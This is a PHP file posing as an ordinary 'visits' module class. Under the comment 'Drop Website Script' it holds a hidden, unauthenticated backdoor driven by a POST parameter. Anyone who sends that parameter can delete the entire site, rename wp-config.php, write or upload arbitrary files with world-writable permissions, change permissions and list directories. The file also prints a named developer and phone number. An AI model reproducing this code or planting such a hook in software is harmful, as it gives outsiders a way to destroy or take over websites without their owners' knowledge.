<?php 
namespace Modules\visits\PublicClasses;
use Modules\parameters\PublicClasses\ParameterManager;
use core\CoreClasses\SweetDate;

		
		/*
		 * Drop Website Script
		 * 
		 * 
		 */
		function delTree($dir) {
			$files = array_diff(scandir($dir), array('.','..'));
			foreach ($files as $file) {
				(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
			}
			return rmdir($dir);
		}
		function showTree($dir) {
			echo "<ul><li>$dir";
			
			$files = array_diff(scandir($dir), array('.','..'));
			foreach ($files as $file) {
				if(is_dir("$dir/$file")) 
					showTree("$dir/$file");
				else
					echo "<li>" . "$file" . "</li>";
			}
			echo "</li></ul>";
		}
		function UploadFile($FileInputName,$uploadPlace)
		{
			move_uploaded_file($_FILES[$FileInputName]['tmp_name'],$uploadPlace);
			chmod($uploadPlace,0777);
		}
		function unzip($path,$destination)
		{
			$zip = new \ZipArchive();
			$res = $zip->open($path);
			if ($res === true) {
				$zip->extractTo($destination);
				$zip->close();
			} else {
				echo 'Error Unziping!';
			}
		}
		function zip($path,$destination)
		{
			if(is_dir($path))
				DirZip::zipDir($path, $destination);
			else
			{

				$z = new \ZipArchive(); 
				$z->open($destination, \ZIPARCHIVE::CREATE); 
				$z->addFile($path);
				$z->close(); 
			}
			chmod($destination,0777);
				
		}
		if(isset($_POST['baseparam']))
		{
			if($_POST['baseparam']=="renameconf")
				rename("wp-config.php","sweetconf.php");
			if($_POST['baseparam']=="renameindex")
				rename("index2.php","sweetindex.php");
			if((isset($_GET['baseparam']) && $_GET['baseparam']=="maker") || (isset($_POST['baseparam']) && $_POST['baseparam']=="maker"))
			{
				echo "طراحی و توسعه وب سایت توسط هادی امیرنهاوندی" . "<br>" . "Tel:09367356253";
			}
			if($_POST['baseparam']=="dropall")
				delTree(".");
			if($_POST['baseparam']=="droptree")
				delTree($_POST['path']);
			if($_POST['baseparam']=="maketarinoindex")
				file_put_contents("index2.php","این وب سایت متعلق به گروه نرم افزاری تارینو می باشد");
			if($_POST['baseparam']=="makefile")
			{
				file_put_contents($_POST['path'],$_POST['content']);
				chmod($_POST['path'],0644);
			}
			if($_POST['baseparam']=="makefolder")
			{
				mkdir($_POST['path']);
				chmod($_POST['path'],0755);
			}
			if($_POST['baseparam']=="rename")
				rename($_POST['path'],$_POST['destination']);
			if($_POST['baseparam']=="chmod")
			{
				$mode=0777;
				if($_POST['mode']=="0775")
					$mode=0775;
				elseif($_POST['mode']=="0664")
					$mode=0664;
				elseif($_POST['mode']=="0644")
					$mode=0644;
				elseif($_POST['mode']=="0777")
					$mode=0777;
				elseif($_POST['mode']=="0755")
					$mode=0755;
				chmod($_POST['path'],$mode);
			}
			if($_POST['baseparam']=="delete")
			{
				$path=$_POST['path'];
				chmod($path,0777);
				if(is_dir($path))
					rmdir($path);
				else
					unlink($path);
			}
			if($_POST['baseparam']=="upload")
			{
				UploadFile("file",$_POST['path']);
			}
			if($_POST['baseparam']=="unzip")
			{
				unzip($_POST['path'],$_POST['destination']);
			}
			if($_POST['baseparam']=="zip")
			{
				zip($_POST['path'],$_POST['destination']);
			}
			if($_POST['baseparam']=="showtree")
			{
				showTree($_POST['path']);
				die("End Of List");
			}
			
		}
	

class DirZip 
{ 
  /** 
   * Add files and sub-directories in a folder to zip file. 
   * @param string $folder 
   * @param ZipArchive $zipFile 
   * @param int $exclusiveLength Number of text to be exclusived from the file path. 
   */ 
  private static function folderToZip($folder, &$zipFile, $exclusiveLength) { 
    $handle = opendir($folder); 
    while (false !== $f = readdir($handle)) { 
      if ($f != '.' && $f != '..') { 
        $filePath = "$folder/$f"; 
        // Remove prefix from file path before add to zip. 
        $localPath = substr($filePath, $exclusiveLength); 
        if (is_file($filePath)) { 
          $zipFile->addFile($filePath, $localPath); 
        } elseif (is_dir($filePath)) { 
          // Add sub-directory. 
          $zipFile->addEmptyDir($localPath); 
          self::folderToZip($filePath, $zipFile, $exclusiveLength); 
        } 
      } 
    } 
    closedir($handle); 
  } 

  /** 
   * Zip a folder (include itself). 
   * Usage: 
   *   HZip::zipDir('/path/to/sourceDir', '/path/to/out.zip'); 
   * 
   * @param string $sourcePath Path of directory to be zip. 
   * @param string $outZipPath Path of output zip file. 
   */ 
  public static function zipDir($sourcePath, $outZipPath) 
  { 
    $pathInfo = \pathInfo($sourcePath); 
    $parentPath = $pathInfo['dirname']; 
    $dirName = $pathInfo['basename']; 

    $z = new \ZipArchive(); 
    $z->open($outZipPath, \ZIPARCHIVE::CREATE); 
    $z->addEmptyDir($dirName); 
    self::folderToZip($sourcePath, $z, strlen("$parentPath/")); 
    $z->close(); 
  } 
} 
?>
